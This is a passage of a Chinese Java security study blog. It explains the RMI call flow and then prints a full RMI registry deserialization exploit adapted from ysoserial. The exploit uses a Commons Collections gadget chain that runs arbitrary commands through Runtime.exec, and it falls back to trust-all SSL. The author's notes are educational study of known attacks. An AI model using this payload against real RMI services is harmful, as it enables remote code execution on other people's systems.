+<li>Skeleton处理客户端请求：bind、list、lookup、rebind、unbind，如果是lookup则查找RMI服务名绑定的接口对象，<strong>序列化该对象</strong>并通过RemoteCall传输到客户端。</li>
+<li>RMI客户端反序列化服务端结果，获取<strong>远程对象的引用</strong>。</li>
+<li>RMI客户端调用远程方法，<strong>RMI服务端反射调用</strong>RMI服务实现类的对应方法并序列化执行结果返回给客户端。</li>
+<li>RMI客户端反序列化RMI远程方法调用结果。</li>
+</ol>
+<p>实验记录：<br>
+RMIClientTest.java</p>
+<pre><code class="language-java">package rmiserver;
+
+import java.rmi.Naming;
+
+public class RMIClientTest {
+
+    public static void main(String[] args) {
+        try {
+            // 查找远程RMI服务
+            RMITestInterface rt = (RMITestInterface) Naming.lookup(&quot;rmi://127.0.0.1:9527/test&quot;);
+
+            // 调用远程接口RMITestInterface类的test方法
+            String result = rt.test();
+
+            // 输出RMI方法调用结果
+            System.out.println(result);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre>
+<p>RMIServerTest.java</p>
+<pre><code class="language-java">package rmiserver;
+
+import java.rmi.Naming;
+import java.rmi.registry.LocateRegistry;
+
+public class RMIServerTest {
+
+    // RMI服务器IP地址
+    public static final String RMI_HOST = &quot;127.0.0.1&quot;;
+
+    // RMI服务端口
+    public static final int RMI_PORT = 9527;
+
+    // RMI服务名称
+    public static final String RMI_NAME = &quot;rmi://&quot; + RMI_HOST + &quot;:&quot; + RMI_PORT + &quot;/test&quot;;
+
+    public static void main(String[] args) {
+        try {
+            // 注册RMI端口
+            LocateRegistry.createRegistry(RMI_PORT);
+
+            // 绑定Remote对象
+            Naming.bind(RMI_NAME, new RMITestImpl());
+
+            System.out.println(&quot;RMI服务启动成功,服务地址:&quot; + RMI_NAME);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+}
+</code></pre>
+<p>RMITestImpl.java</p>
+<pre><code class="language-java">package rmiserver;
+
+import java.rmi.RemoteException;
+import java.rmi.server.UnicastRemoteObject;
+
+public class RMITestImpl extends UnicastRemoteObject implements RMITestInterface {
+
+    private static final long serialVersionUID = 1L;
+
+    protected RMITestImpl() throws RemoteException {
+        super();
+    }
+
+    /**
+     * RMI测试方法
+     *
+     * @return 返回测试字符串
+     */
+    @Override
+    public String test() throws RemoteException {
+        return &quot;Hello RMI~&quot;;
+    }
+
+}
+</code></pre>
+<p>RMITestInterface.java</p>
+<pre><code class="language-java">package rmiserver;
+
+import java.rmi.Remote;
+import java.rmi.RemoteException;
+
+/**
+ * RMI测试接口
+ */
+public interface RMITestInterface extends Remote {
+
+    /**
+     * RMI测试方法
+     *
+     * @return 返回测试字符串
+     */
+    String test() throws RemoteException;
+
+}
+
+</code></pre>
+<p>使用上述代码作为例子，我们可以梳理前面的RMI调用流程：</p>
+<ol>
+<li><strong>客户端创建Stub</strong>:
+<ul>
+<li>在您的例子中，当您在客户端执行**Naming.lookup(&quot;rmi://127.0.0.1:9527/test&quot;)**时，Java的RMI系统实际上在幕后创建了Stub。这个Stub代表远程对象，并知道如何与远程RMI服务通信。</li>
+</ul>
+</li>
+<li><strong>Stub创建RemoteCall对象</strong>:
+<ul>
+<li>这一步是在RMI内部发生的，Stub会为即将进行的远程方法调用创建一个RemoteCall对象。</li>
+</ul>
+</li>
+<li><strong>参数序列化</strong>:
+<ul>
+<li>在本例中，**test()**方法没有参数，所以这一步没有序列化参数的操作。但如果有参数，它们将在这一步被序列化。</li>
+</ul>
+</li>
+<li><strong>客户端发送请求到服务器</strong>:
+<ul>
+<li>当您在客户端上调用<strong>rt.test()<strong>时，Stub会通过网络（基于TCP/IP和Socket）向RMI服务发送一个请求，该请求指示它想调用</strong>test</strong>方法。</li>
+</ul>
+</li>
+<li><strong>服务器端反序列化请求数据</strong>:
+<ul>
+<li>服务器端收到该请求，然后准备调用<strong>RMITestImpl</strong>中的<strong>test</strong>方法。如果<strong>test</strong>方法有参数，它们会被反序列化为Java对象。</li>
+</ul>
+</li>
+<li><strong>Skeleton处理请求</strong>:
+<ul>
+<li>在早期的Java版本中，RMI使用了Skeleton。但在后续版本中，Skeleton被淘汰。在您的例子中，由于没有显式的Skeleton，这个步骤其实是由RMI的服务器端框架来处理的，它直接调用<strong>RMITestImpl</strong>的<strong>test</strong>方法。</li>
+</ul>
+</li>
+<li><strong>返回值序列化</strong>:
+<ul>
+<li><strong>test</strong>方法返回字符串**&quot;Hello RMI~&quot;**。这个返回值在服务器端被序列化，以便可以通过网络发送回客户端。</li>
+</ul>
+</li>
+<li><strong>服务器发送响应到客户端</strong>:
+<ul>
+<li>序列化后的**&quot;Hello RMI~&quot;**字符串作为响应被发送回客户端。</li>
+</ul>
+</li>
+<li><strong>客户端Stub反序列化返回值</strong>:
+<ul>
+<li>当响应到达客户端，Stub会反序列化它，从而获取<strong>test</strong>方法的实际返回值。</li>
+</ul>
+</li>
+<li><strong>客户端接收远程方法的返回值</strong>:</li>
+</ol>
+<ul>
+<li>客户端现在有了<strong>test</strong>方法的返回值，并将其打印出来，输出为：&quot;Hello RMI~&quot;。</li>
+</ul>
+<h2 id="rmi反序列化漏洞">RMI反序列化漏洞</h2>
+<p>既然RMI使用了反序列化机制来传输Remote对象，那么可以通过构建一个恶意的Remote对象，这个对象经过序列化后传输到服务器端，服务器端在反序列化时候就会触发反序列化漏洞。</p>
+<p>记录下代码，用到了三方库apache.commons.collections</p>
+<pre><code class="language-java">package rmiserver;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+
+import javax.net.ssl.SSLContext;
+import javax.net.ssl.SSLSocketFactory;
+import javax.net.ssl.TrustManager;
+import javax.net.ssl.X509TrustManager;
+import java.io.IOException;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.net.Socket;
+import java.rmi.ConnectIOException;
+import java.rmi.Remote;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+import java.rmi.server.RMIClientSocketFactory;
+import java.security.cert.X509Certificate;
+import java.util.HashMap;
+import java.util.Map;
+
+/**
+ * RMI反序列化漏洞利用，修改自ysoserial的RMIRegistryExploit：https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/RMIRegistryExploit.java
+ *
+ * @author yz
+ */
+public class RMIExploit {
+    // RMI服务器IP地址
+    public static final String RMI_HOST = &quot;127.0.0.1&quot;;
+
+    // RMI服务端口
+    public static final int RMI_PORT = 9527;
+
+    // RMI服务名称
+    public static final String RMI_NAME = &quot;rmi://&quot; + RMI_HOST + &quot;:&quot; + RMI_PORT + &quot;/test&quot;;
+    // 定义AnnotationInvocationHandler类常量
+    public static final String ANN_INV_HANDLER_CLASS = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;;
+
+    /**
+     * 信任SSL证书
+     */
+    private static class TrustAllSSL implements X509TrustManager {
+
+        private static final X509Certificate[] ANY_CA = {};
+
+        public X509Certificate[] getAcceptedIssuers() {
+            return ANY_CA;
+        }
+
+        public void checkServerTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }
+
+        public void checkClientTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }
+
+    }
+
+    /**
+     * 创建支持SSL的RMI客户端
+     */
+    private static class RMISSLClientSocketFactory implements RMIClientSocketFactory {
+
+        public Socket createSocket(String host, int port) throws IOException {
+            try {
+                // 获取SSLContext对象
+                SSLContext ctx = SSLContext.getInstance(&quot;TLS&quot;);
+
+                // 默认信任服务器端SSL
+                ctx.init(null, new TrustManager[]{new TrustAllSSL()}, null);
+
+                // 获取SSL Socket连接工厂
+                SSLSocketFactory factory = ctx.getSocketFactory();
+
+                // 创建SSL连接
+                return factory.createSocket(host, port);
+            } catch (Exception e) {
+                throw new IOException(e);
+            }
+        }
+    }
+
+    /**
+     * 使用动态代理生成基于InvokerTransformer/LazyMap的Payload
+     *
+     * @param command 定义需要执行的CMD
+     * @return Payload
+     * @throws Exception 生成Payload异常
+     */
+    private static InvocationHandler genPayload(String command) throws Exception {
+        // 创建Runtime.getRuntime.exec(cmd)调用链
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{
+                        String.class, Class[].class}, new Object[]{
+                        &quot;getRuntime&quot;, new Class[0]}
+                ),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]{
+                        Object.class, Object[].class}, new Object[]{
+                        null, new Object[0]}
+                ),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{command})
+        };
+
+        // 创建ChainedTransformer调用链对象
+        Transformer transformerChain = new ChainedTransformer(transformers);
+
+        // 使用LazyMap创建一个含有恶意调用链的Transformer类的Map对象
+        final Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain);
+
+        // 获取AnnotationInvocationHandler类对象
+        Class clazz = Class.forName(ANN_INV_HANDLER_CLASS);
+
+        // 获取AnnotationInvocationHandler类的构造方法
+        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
+
+        // 设置构造方法的访问权限
+        constructor.setAccessible(true);
+
+        // 实例化AnnotationInvocationHandler，
+        // 等价于: InvocationHandler annHandler = new AnnotationInvocationHandler(Override.class, lazyMap);
+        InvocationHandler annHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
+
+        // 使用动态代理创建出Map类型的Payload
+        final Map mapProxy2 = (Map) Proxy.newProxyInstance(
+                ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, annHandler
+        );
+
+        // 实例化AnnotationInvocationHandler，
+        // 等价于: InvocationHandler annHandler = new AnnotationInvocationHandler(Override.class, mapProxy2);
+        return (InvocationHandler) constructor.newInstance(Override.class, mapProxy2);
+    }
+
+    /**
+     * 执行Payload
+     *
+     * @param registry RMI Registry
+     * @param command  需要执行的命令
+     * @throws Exception Payload执行异常
+     */
+    public static void exploit(final Registry registry, final String command) throws Exception {
+        // 生成Payload动态代理对象
+        Object payload = genPayload(command);
+        String name    = &quot;test&quot; + System.nanoTime();
+
+        // 创建一个含有Payload的恶意map
+        Map&lt;String, Object&gt; map = new HashMap();
+        map.put(name, payload);
+
+        // 获取AnnotationInvocationHandler类对象
+        Class clazz = Class.forName(ANN_INV_HANDLER_CLASS);
+
+        // 获取AnnotationInvocationHandler类的构造方法
+        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
+
+        // 设置构造方法的访问权限
+        constructor.setAccessible(true);
+
+        // 实例化AnnotationInvocationHandler，
+        // 等价于: InvocationHandler annHandler = new AnnotationInvocationHandler(Override.class, map);
+        InvocationHandler annHandler = (InvocationHandler) constructor.newInstance(Override.class, map);
+
+        // 使用动态代理创建出Remote类型的Payload
+        Remote remote = (Remote) Proxy.newProxyInstance(
+                ClassLoader.getSystemClassLoader(), new Class[]{Remote.class}, annHandler
+        );
+
+        try {
+            // 发送Payload
+            registry.bind(name, remote);
+        } catch (Throwable e) {
+            e.printStackTrace();
+        }
+    }
+
+    public static void main(String[] args) throws Exception {
+        System.setProperty(&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;, &quot;true&quot;);
+        if (args.length == 0) {
+            // 如果不指定连接参数默认连接本地RMI服务
+            args = new String[]{RMI_HOST, String.valueOf(RMI_PORT), &quot;open -a Calculator.app&quot;};
+        }
+
+        // 远程RMI服务IP
+        final String host = args[0];
+
+        // 远程RMI服务端口
+        final int port = Integer.parseInt(args[1]);
+
+        // 需要执行的系统命令
+        final String command = args[2];
+
+        // 获取远程Registry对象的引用
+        Registry registry = LocateRegistry.getRegistry(host, port);
+
+        try {
+            // 获取RMI服务注册列表(主要是为了测试RMI连接是否正常)
+            String[] regs = registry.list();
+
+            for (String reg : regs) {
+                System.out.println(&quot;RMI:&quot; + reg);
+            }
+        } catch (ConnectIOException ex) {
+            // 如果连接异常尝试使用SSL建立SSL连接,忽略证书信任错误，默认信任SSL证书
+            registry = LocateRegistry.getRegistry(host, port, new RMISSLClientSocketFactory());
+        }
+
+        // 执行payload
+        exploit(registry, command);
+    }
+
+}
+</code></pre>
+<p>这个实验暂时没跑通，原理之后再看一下<br>
+<img src="https://skyblu3519.github.io/post-images/1695570073215.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1695570079106.png" alt="" loading="lazy"></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">本地命令执行</a>
+<ul>
+<li><a href="#runtime%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%B0%83%E7%94%A8%E9%93%BE">Runtime命令执行调用链</a></li>
+<li><a href="#%E5%8F%8D%E5%B0%84unixprocessprocessimpl%E6%89%A7%E8%A1%8C%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4">反射UNIXProcess/ProcessImpl执行本地命令</a></li>
+<li><a href="#forkandexec%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-unsafe%E5%8F%8D%E5%B0%84native%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8">forkAndExec命令执行-Unsafe+反射+Native方法调用</a></li>
+<li><a href="#%E4%BB%A3%E5%8A%9E">代办</a></li>
+</ul>
+</li>
+<li><a href="#jdbc">JDBC</a>
+<ul>
+<li><a href="#datasource">DataSource</a>
+<ul>
+<li><a href="#%E5%BE%85%E5%8A%9E%E6%95%B0%E6%8D%AE%E6%BA%90%E6%B3%A8%E5%85%A5">待办：数据源注入</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#urlconnection">URLConnection</a></li>
+<li><a href="#jni%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80">JNI安全基础</a>
+<ul>
+<li><a href="#jni%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">JNI命令执行</a></li>
+</ul>
+</li>
+<li><a href="#java%E5%BA%8F%E5%88%97%E5%8C%96">Java序列化</a>
+<ul>
+<li><a href="#java-%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">Java 序列化/反序列化</a></li>
+<li><a href="#objectinputstream-objectoutputstream">ObjectInputStream、ObjectOutputStream</a></li>
+<li><a href="#javaioexternalizable">java.io.Externalizable</a></li>
+<li><a href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%BA%8F%E5%88%97%E5%8C%96writeobject%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96readobject">自定义序列化(writeObject)和反序列化(readObject)</a></li>
+<li><a href="#%E5%BE%85%E5%8A%9E%E4%BA%8B%E9%A1%B9">待办事项</a></li>
+</ul>
+</li>
+<li><a href="#rmi">RMI</a>
+<ul>
+<li><a href="#rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">RMI反序列化漏洞</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/java-an-quan-xue-xi-bi-ji/">
+              <h3 class="post-title">
+                JAVA安全学习笔记（1）
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
